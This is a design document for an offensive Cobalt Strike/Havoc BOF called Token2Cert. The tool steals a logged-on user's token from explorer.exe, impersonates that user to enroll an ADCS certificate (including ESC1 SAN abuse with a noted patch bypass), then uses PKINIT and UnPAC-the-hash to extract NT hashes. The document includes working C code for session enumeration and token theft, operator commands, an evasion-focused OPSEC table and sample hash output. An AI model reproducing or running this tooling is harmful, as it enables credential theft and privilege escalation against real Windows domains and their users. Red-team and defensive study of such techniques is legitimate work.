# Token2Cert BOF - Design Document

## Overview

Token2Cert is a Cobalt Strike/Havoc BOF that combines Token Stealing with ADCS certificate enrollment and PKINIT authentication to extract NT hashes from users with active sessions.

**Attack Chain:**
1. Enumerate active sessions
2. Steal token from target user's process (explorer.exe)
3. Impersonate and request certificate (template User or ESC1)
4. Revert to original context
5. PKINIT authentication with obtained certificate
6. UnPAC-the-hash to extract NT hash

## OPSEC Profile

| Aspect | Value |
|--------|-------|
| PowerShell | No |
| Files on disk | No |
| Process Injection | No |
| New visible process | No |
| Everything in memory | Yes |
| Event logs | 4624 (logon), 4768 (TGT) |

## Commands

```bash
# Enumerate active sessions
beacon> token2cert sessions

# Simple mode (User template, cert for session user)
beacon> token2cert run <session_id|username>
beacon> token2cert run 1
beacon> token2cert run Administrator

# ESC1 mode (vulnerable template, arbitrary SAN)
beacon> token2cert run <session_id|username> <CA> <template> <target_upn>
beacon> token2cert run 1 "CA01\Corp-CA" ESC1 administrator@corp.local
```

## Architecture

```
Token2Cert BOF
│
├── Session Enumeration
│   ├── WTSEnumerateSessionsW()
│   └── WTSQuerySessionInformationW()
│
├── Token Stealing
│   ├── CreateToolhelp32Snapshot()
│   ├── Process32First/Next() → find explorer.exe
│   ├── ProcessIdToSessionId()
│   ├── OpenProcess()
│   ├── OpenProcessToken()
│   └── DuplicateTokenEx()
│
├── Impersonation
│   ├── ImpersonateLoggedOnUser()
│   └── RevertToSelf()
│
├── Certificate Request (from ESC1-unPAC)
│   ├── CryptAcquireContextW()
│   ├── CryptGenKey()
│   ├── ICertRequest::Submit()
│   └── PFXExportCertStoreEx()
│
├── PKINIT (from ESC1-unPAC)
│   ├── DH Key Generation
│   ├── AuthPack Construction
│   ├── CMS SignedData
│   ├── AS-REQ Build
│   └── SendToKdc()
│
└── UnPAC-the-hash (from ESC1-unPAC)
    ├── ProcessAsRep()
    ├── KerberosDecrypt()
    ├── ParsePacCredentialData()
    └── U2U fallback
```

## Modes of Operation

### Mode 1: Simple (No SAN)

```
User runs: token2cert run 1

Flow:
1. Steal token from Session 1 (e.g., Administrator)
2. Impersonate Administrator
3. Request cert with template "User"
   → Certificate issued TO Administrator (legitimate)
   → No SAN manipulation needed
4. RevertToSelf
5. PKINIT as Administrator
6. Extract Administrator's NT hash
```

### Mode 2: ESC1 (With SAN)

```
User runs: token2cert run 2 "CA01\Corp-CA" ESC1 administrator@corp.local

Flow:
1. Steal token from Session 2 (e.g., helpdesk)
2. Impersonate helpdesk
3. Request cert with template "ESC1"
   → Certificate with SAN = administrator@corp.local
   → SID included for KB5014754 bypass
4. RevertToSelf
5. PKINIT as Administrator
6. Extract Administrator's NT hash

Use case: helpdesk has enrollment rights on ESC1 template, you don't
```

## Code Structure

```
Token2Cert/
├── README.md
├── Makefile
├── build.sh
├── docs/
│   └── plans/
│       └── 2026-01-22-token2cert-design.md
├── cobaltstrike/
│   ├── token2cert.cna
│   └── bofs/
│       └── token2cert.x64.o
├── havoc/
│   └── token2cert.py
├── include/
│   ├── beacon.h
│   └── bofdefs.h
└── src/
    └── token2cert.c
```

## Implementation Details

### Session Enumeration

```c
void EnumerateSessions() {
    PWTS_SESSION_INFOW pSessions = NULL;
    DWORD count = 0;

    if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &count)) {
        return;
    }

    for (DWORD i = 0; i < count; i++) {
        if (pSessions[i].State == WTSActive) {
            LPWSTR username = NULL;
            DWORD len = 0;
            WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE,
                                        pSessions[i].SessionId,
                                        WTSUserName, &username, &len);
            // Output session info
        }
    }
    WTSFreeMemory(pSessions);
}
```

### Token Stealing

```c
HANDLE StealTokenFromSession(DWORD targetSessionId) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                DWORD sessionId;
                if (ProcessIdToSessionId(pe.th32ProcessID, &sessionId) &&
                    sessionId == targetSessionId) {

                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                                  FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        HANDLE hToken, hDupToken;
                        if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                            DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                                           SecurityImpersonation, TokenImpersonation,
                                           &hDupToken);
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            CloseHandle(hSnapshot);
                            return hDupToken;
                        }
                        CloseHandle(hProcess);
                    }
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return NULL;
}
```

### Simple Certificate Request (No SAN)

```c
char* RequestCertSimple(const char* templateName, int* outLen) {
    // Uses X509Enrollment COM or ICertRequest
    // Template "User" - no SAN manipulation
    // Certificate issued to impersonated user

    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;

    // Generate key pair
    CryptAcquireContextW(&hProv, containerName, MS_ENHANCED_PROV_W,
                         PROV_RSA_FULL, CRYPT_NEWKEYSET);
    CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey);

    // Build simple CSR (no custom SAN)
    // Submit to CA
    // Export as PFX

    return pfxBase64;
}
```

## Requirements

- Elevated privileges (Admin/SYSTEM)
- Target user must have active session
- Network access to CA and KDC
- x64 beacon only

## Output

```
[*] Token2Cert - Token Stealing + PKINIT + UnPAC
[*] Target: Session 1 (EVILCORP\Administrator)
[+] Token stolen from explorer.exe (PID: 1234)
[+] Impersonating EVILCORP\Administrator
[*] Requesting certificate (template: User)
[+] Certificate enrolled successfully
[+] Reverted to original context

[+] PFX (base64, password: Token2Cert):
MIIQoQIBAzCCEGcGCSqGSIb3DQEHAaCCEFgEghBUMIIQUD...

[*] Performing PKINIT authentication...
[+] TGT obtained!

[+] TGT (kirbi, base64):
doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqq...

[+] NT Hash: 32ed87bdb5fdc5e9cba88547376818d4
```

## References

- ESC1-unPAC BOF (PKINIT + UnPAC implementation)
- RFC 4556 - PKINIT
- RFC 4120 - Kerberos V5
- Certified Pre-Owned - SpecterOps
